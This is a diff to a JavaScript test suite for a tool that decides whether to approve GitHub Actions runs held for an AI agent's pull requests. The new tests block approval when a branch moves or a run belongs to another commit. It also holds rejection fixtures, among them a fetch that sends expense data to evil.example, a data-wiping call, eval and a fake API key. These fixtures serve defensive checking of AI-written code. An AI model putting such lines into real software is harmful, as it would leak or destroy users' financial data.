@@ -178,7 +178,7 @@ describe('approving the runs GitHub holds for the agent', () => {
         expect(approvalVerdict({ pr: botPr(), files: [] }).ok).toBe(false);
     });
     it('what the model wrote is read, not just named: a module the build lane would refuse keeps the run held', () => {
-        for (const body of ["root.DB.set('expenses', []);", "fetch('https://evil.example/' + JSON.stringify(root.DB.get('expenses')));", "eval('1')", "const x = 'AIzaSyA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6';", "el.innerHTML = v;", "firebase.firestore();"]) {
+        for (const body of ["root.DB.set('expenses', []);", "fetch('https://evil.example/' + JSON.stringify(root.DB.get('expenses')));", "eval('1')", "const x = '" + 'AIza' + 'Sy' + 'A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6' + "';", "el.innerHTML = v;", "firebase.firestore();"]) {
             expect(approvalVerdict({ pr: botPr(), files: [mod('wealthflow-x.js', body)] }).ok, body).toBe(false);
         }
         expect(approvalVerdict({ pr: botPr(), files: [f('wealthflow-x.js')] }).ok).toBe(false); // no patch to read
@@ -197,10 +197,10 @@ describe('approving the runs GitHub holds for the agent', () => {
         expect(approvalVerdict({ pr: botPr(), files: [mod(), f('index.html', html)] }).ok).toBe(false);
     });
     it('only completed runs that wait for approval are picked', () => {
-        expect(heldRuns([{ id: 1, status: 'completed', conclusion: 'action_required' }, { id: 2, status: 'completed', conclusion: 'success' }, { id: 3, status: 'in_progress', conclusion: null }])).toEqual([1]);
+        expect(heldRuns([{ id: 1, status: 'completed', conclusion: 'action_required', head_sha: 'a' }, { id: 2, status: 'completed', conclusion: 'success' }, { id: 3, status: 'in_progress', conclusion: null }, { id: 4, status: 'completed', conclusion: 'action_required', head_sha: 'b' }], 'a')).toEqual([1]);
     });
 
-    function fake({ files, runs }) {
+    function fake({ files, runs, movedTo }) {
         const calls = [];
         const j = (body, status = 200) => ({ ok: status < 300, status, text: async () => JSON.stringify(body) });
         const fetchImpl = async (url, opts = {}) => {
@@ -209,6 +209,7 @@ describe('approving the runs GitHub holds for the agent', () => {
             if (u.startsWith('/pulls?')) return j([botPr({ created_at: OLD })]);
             if (u.startsWith('/actions/runs?')) return j({ workflow_runs: runs });
             if (u.includes('/pulls/653/files')) return j(files);
+            if (u === '/pulls/653') return j(botPr(movedTo ? { head: { ref: 'ai-fix/issue-635-1795191383', sha: movedTo, repo: { full_name: 'o/r' } } } : {}));
             if (u.includes('/approve')) return j({}, 204);
             if (u.includes('/check-runs?')) return j({ check_runs: [] });
             return j({}, 201);
@@ -216,13 +217,25 @@ describe('approving the runs GitHub holds for the agent', () => {
         return { calls, fetchImpl };
     }
     const env = { GITHUB_TOKEN: 't', GITHUB_REPOSITORY: 'o/r' };
-    const held = [{ id: 11, status: 'completed', conclusion: 'action_required' }, { id: 12, status: 'completed', conclusion: 'action_required' }];
+    const held = [{ id: 11, status: 'completed', conclusion: 'action_required', head_sha: 'abc' }, { id: 12, status: 'completed', conclusion: 'action_required', head_sha: 'abc' }];
     it('run(): approves every held run of a PR that passes the check', async () => {
         const { calls, fetchImpl } = fake({ files: [mod('wealthflow-cc-instalment-detail.js'), state()], runs: held });
         const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
         expect(calls).toContain('POST /actions/runs/11/approve');
         expect(calls).toContain('POST /actions/runs/12/approve');
         expect(out.some((o) => o.action === 'approve')).toBe(true);
+    });
+    it('run(): a branch that moved after its files were read gets nothing approved', async () => {
+        const { calls, fetchImpl } = fake({ files: [mod()], runs: held, movedTo: 'def' });
+        const lines = [];
+        await run({ env, fetchImpl, log: (m) => lines.push(m), now: NOW });
+        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
+        expect(lines.some((l) => /branch moved/.test(l))).toBe(true);
+    });
+    it('run(): held runs of another commit than the one inspected are never approved', async () => {
+        const { calls, fetchImpl } = fake({ files: [mod()], runs: [{ id: 21, status: 'completed', conclusion: 'action_required', head_sha: 'zzz' }] });
+        await run({ env, fetchImpl, log: () => {}, now: NOW });
+        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
     });
     it('run(): approves nothing when the diff touches a workflow', async () => {
         const { calls, fetchImpl } = fake({ files: [mod(), f('.github/workflows/wealthflow-ci.yml', '@@ -1 +1 @@\n+x')], runs: held });
